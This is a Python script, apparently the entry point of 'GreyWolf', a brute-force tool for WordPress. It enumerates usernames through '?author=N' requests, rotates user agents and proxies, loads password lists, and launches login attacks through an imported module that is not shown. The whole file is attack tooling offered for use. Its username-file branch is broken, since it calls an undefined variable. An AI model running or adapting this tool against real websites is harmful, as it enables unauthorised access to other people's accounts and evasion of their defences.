import sys
import time
if not sys.version_info.major == 3:
    print("[ERROR] GreyWolf is using Python3. Use Python3.")
    time.sleep(3)
    sys.exit()


#python imports
import random

try:
    from datetime import datetime
except:
    print("[ERROR] Install datetime module. (pip3 install colorama)")
    time.sleep(3)
    sys.exit()

try:
    from colorama import init,Fore
    init()
except:
    print("[ERROR] Install colorama module. (pip3 install datetime)")
    time.sleep(3)
    sys.exit()

try:
    from bs4 import BeautifulSoup
except:
    print("[ERROR] Install bs4 module. (pip3 install bs4)")
    time.sleep(3)
    sys.exit()

try:
    import requests
except:
    print("[ERROR] Install requests module. (pip3 install requests)")
    time.sleep(3)
    sys.exit()

#greywolf imports
from lib.wordpress import Wordpress
from lib.userAgent import userAgents


def askAddress(panel = False):

    while True:
        if not panel:
            print(Fore.CYAN + "(?) Enter website address " + Fore.RED + "(not admin panel) " + Fore.CYAN + "  -> ", end="")
            address = input()

        else:
            print(Fore.CYAN + "(?) Enter admin panel  -> ", end="")
            address = input()


        if "http://" not in address and "https://" not in address:
            print(Fore.RED + "[-] Invalid website, please enter website with http:// or https:// \n")
            continue

        if address.endswith("/"):
            address = address[:-1]

        try:
            print(Fore.WHITE + f"[*]Requesting {address} ..")
            req = requests.get(address, headers = {"user-agent":random.choice(userAgents)},timeout = 7)
            if req.status_code != 200:
                print(Fore.RED + f"[-] Can't reach {address} , http code is {req.status_code} \n")
                continue

            else:
                print(Fore.CYAN + "[+] Successful request, status is OK.. \n")
                return address

        except:
            print(Fore.RED + f"[ERROR] An error occured while requesting {address} , check your internet connection or website. \n")
            continue


def askPasswordPath():

    while True:
        print(Fore.CYAN + "(?) Enter password file path   -> ", end = "")
        passwordPath = input()
        passwordPath = fr"{passwordPath}" #preventing from escape lines..

        try:
            passwordFile = open(passwordPath, "r")
            lines = []
            for line in passwordFile.readlines():
                if len(line.strip()) > 0:
                    lines.append(line.strip())

            if len(lines) == 0:
                print(Fore.RED + "[ERROR] Password file is empty.. \n")
                continue

            else:
                print(Fore.CYAN + f"[+] Valid password file. \n")
                return passwordPath

        except:
            print(Fore.RED + f"[ERROR] Invalid password file path.. \n")
            continue


def askProxyPath():

    isValid = True

    print(Fore.RED + "[*] Tip: If you didn't brute-forced the website before, try with no proxies first.")
    print(Fore.RED + "[*] Tip: Maybe there is no brute-force protection >:D")

    while True:
        print(Fore.CYAN + "(?) Enter proxy file path " + Fore.RED + "(press enter for no proxy option)" + Fore.CYAN + "   -> ", end = "")
        proxyPath = input()
        proxyPath = fr"{proxyPath}"  # preventing from escape lines..

        if len(proxyPath) == 0:
            print("\n")
            return None

        try:
            proxyFile = open(proxyPath, "r")
            lines = []
            for line in proxyFile.readlines():
                if len(line.strip()) > 0:

                    if line.count(".") == 3 and line.count(":") == 1:
                        pass
                    else:
                        print(Fore.RED + "[ERROR] Invalid proxy format.. GreyWolf is using http/https proxies..")
                        print(Fore.RED + "[ERROR] Proxies should be like proxy:port , example  proxy -> 217.172.122.16:8080 ")
                        print("\n")
                        isValid = False
                        break

                    lines.append(line.strip())

            if len(lines) == 0:
                print(Fore.RED + "[ERROR] Proxy file is empty..")
                print("\n")
                continue

            else:
                if isValid:
                    print(Fore.CYAN + f"[+] Valid proxy file.. \n")
                    return proxyPath

                else:
                    continue

        except Exception as e:
            print(Fore.RED + f"[ERROR] Invalid proxy file path.. \n")
            continue


def findUsernames(address):
    #first request to the website to find usernames, if requests are successful, return this usernames
    #else if requests are not successful, ask an input to username path or username
    #if we can open input as a file, accept input as file path and add lines into the usernames list
    #else accept input as a single username

    #im not defining requesting for usernames and asking for username path as two separate functions because -
    #they are returning same input, a username list and  in that way it is easier to assing this function to a variable

    usernames = []
    usernameCounter = 1
    session = requests.Session()
    print(Fore.WHITE + f"[*]Trying to extract usernames from {address} ..")
    # request to find usernames
    while True:
        try:
            req = session.get(address + f"/?author={str(usernameCounter)}",headers ={"user-agent":random.choice(userAgents)}, timeout = 7)
            soup = BeautifulSoup(req.text, "html.parser")

            username = soup.find("a",attrs = {"rel":"author"})
            if username: #if we can see admin account
                print(Fore.GREEN + f"[+] )-> {str(usernameCounter)}  Found username -> ",username.text.strip().replace("\n","").replace("  ",""))
                usernames.append(username.text.strip().replace("\n","").replace("  ",""))
                usernameCounter += 1
            else:
                if len(usernames) > 0:
                    return usernames
                else:
                    print(Fore.RED + f"[-] Couldn't find usernames. \n")
                    break

        except Exception as e:
            print(Fore.RED + "An error occured while requesting for usernames.. \n")
            print(e)
            break

    #ask input to find username/s.
    while True:
        print(Fore.WHITE + "(?) Enter the username or the username file path   -> ", end = "")
        usernamePath = input()
        usernamePath = fr"{usernamePath}" #preventing from escape lines..

        try:
            usernameFile = open(usernamePath, "r")
            lines = []
            for line in usernameFile:
                if len(line) > 0:
                    isFileEmpty.append(line.strip())

            if len(lines) == 0:
                print(Fore.RED + "[ERROR] Username file is empty.. \n")
                continue

            else:
                print(Fore.CYAN + "[+] Valid username file. \n")
                return lines #return usernames

        except Exception as e:
            if len(usernamePath) > 0:
                print(Fore.RED + f"[ERROR] There is no file as {usernamePath}")
                print(Fore.CYAN + f"[+] Accepting {usernamePath} as a single username..")
                usernames.append(usernamePath)
                return usernames
            else:
                print(Fore.RED + "[ERROR] Username can not be empty! \n")


def banner():
    bannerText = Fore.RED + fr"""
                                  __
    {Fore.CYAN + "Version 0.1" + Fore.RED}                 .d$$b       ___                          
    {Fore.CYAN + "Banner" + Fore.RED}:Blazej Kozlowski   .' TO$;\    .'   \  .___    ___  ,    .
    {Fore.CYAN + "Author" + Fore.RED}:Meliksah Bozkurt  /  : TP._;   |       /   \ .'   ` |    `        
    {Fore.CYAN + "github/meliksahbozkurt" + Fore.RED}  / _.;  :Tb|   |    _  |   ' |----' |    |       
                           /   /   ;j$j    `.___| /     `.___,  `---|.
                       _.-"       d$$$$                         \___/  
                     .' ..       d$$$$;
                    /  /P'      d$$$$P. |\      .       __         .   ,__ 
                   /   "      .d$$$P' |\^"l    /       |    __.   |   /  `
                 .'           `T$P^"''""  :    |       |  .'   \  |   |__ 
             ._.'      _.'                ;    |  /\   /  |    |  |   | 
          `-.-".-'-' ._.       _.-"    .-"     |,'  \,'    `._.' /\__ |    
        `.-" _____  ._              .-                                /  
       -(.g$$$$$$$b.              .'
         ""^^T$$$P^)            .(:          {Fore.CYAN + "Brute force tool for dummies." + Fore.RED}
           _/  -"  /.'         /:/;               {Fore.CYAN + "-> Wordpress" + Fore.RED}
        ._.'-'`-'  ")/         /;/;               
     `-.-"..--""   " /         /  ;
    .-" ..--""        -'          :
    ..--""--.-"         (\      .-(\
      ..--""              `-\(\/;`   

    """

    for line in bannerText.split("\n"):
        print(line)
        time.sleep(0.01)


if __name__ == "__main__":
    banner()

    address = askAddress(panel = False)
    passwordPath = askPasswordPath()
    proxyPath = askProxyPath()
    usernames = findUsernames(address)

    greywolf = Wordpress(address,usernames,passwordPath,proxyPath)

    greywolf.readPasswords()
    greywolf.readProxies()

    method = greywolf.testMethods()
    if method == "UNKNOWN":
        greywolf.address = askAddress(panel = True)
        greywolf.ATTACK("WPLOGIN")

    else:
        greywolf.ATTACK(method)





